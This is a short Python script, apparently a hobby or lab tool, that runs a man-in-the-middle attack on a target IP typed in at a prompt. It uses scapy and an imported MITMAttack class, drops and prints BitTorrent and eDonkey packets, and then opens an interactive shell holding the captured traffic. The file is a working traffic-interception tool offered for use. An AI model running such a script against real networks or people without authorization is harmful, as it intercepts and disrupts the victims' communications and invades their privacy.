#!/usr/bin/env python3
from scapy.all import *
from mitm import MITMAttack

def filter_out_torrent(p):
    torrent_ports = list(range(6881, 6889+1)) + [6969, 4662]  # + [bittorrent tracker, eDonkey]
    if TCP in p and (p[TCP].sport in torrent_ports or p[TCP].dport in torrent_ports):
        print("Intercepted torrent packet", p.direction)
        print(p.show())
        return False
    else:
        return p

def main():
    mitm = MITMAttack(
            target_ip=input("Target's IP: "),
            user_filter=filter_out_torrent,
            verbose=False)
    with mitm as resp:
        packets = resp
    import code
    code.interact(local=locals())

if __name__ == "__main__":
    main()
